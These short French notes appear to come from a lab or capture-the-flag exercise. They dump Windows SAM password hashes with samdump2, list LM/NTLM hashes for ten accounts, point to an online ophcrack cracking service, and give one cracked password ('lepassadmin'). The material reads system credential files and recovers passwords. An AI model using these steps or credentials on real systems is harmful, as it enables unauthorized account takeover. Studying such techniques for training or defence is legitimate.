# echo des hashes dans le fichier hashes
`samdump2 system sam -o hashes`

Administrateur:500:aad3b435b51404eeaad3b435b51404ee:7a6f82161a94195d89d87c952e00c9c9:::
*disabled* Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* HelpAssistant:1000:aad3b435b51404eeaad3b435b51404ee:d12fa30418c1efa33a4858ae2efd06cd:::
*disabled* SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:2c88cca4743481a2affeb9842053e0a9:::
ASPNET:1004:aad3b435b51404eeaad3b435b51404ee:ffeaaab52e8425572c0f94ce07eba353:::
S3TH:1006:5be2f045fe0cda0caad3b435b51404ee:a1bbd487a747f1f2323d2ef782e1889e:::
DivX:1007:ec7205e1188ea8fcaad3b435b51404ee:ab46e7e667784f44848b08e75abbf564:::
Admin:1008:7330a4bd82a2c75925ad3b83fa6627c7:3f0f549fb91e89cbeb4f478fa96b2a8a:::
bravo:1009:28750d5bf5814da7b6fe535a75cb5552:2b9801806c5ff2863b3e6a03c2e7a3c6:::
lepassest:1010:fcdb94c2397b0d79e3fde35124ff2ad4:3dfd67bb0c7957ed3520c259e23ba5a4:::

# décryptage des NTLM hashes
http://www.objectif-securite.ch/en/ophcrack.php

prendre celui de lepassest fcdb94c2397b0d79e3fde35124ff2ad4:3dfd67bb0c7957ed3520c259e23ba5a4 qui donne lepassadmin
prendre celui de Admin 7330a4bd82a2c75925ad3b83fa6627c7:3f0f549fb91e89cbeb4f478fa96b2a8a
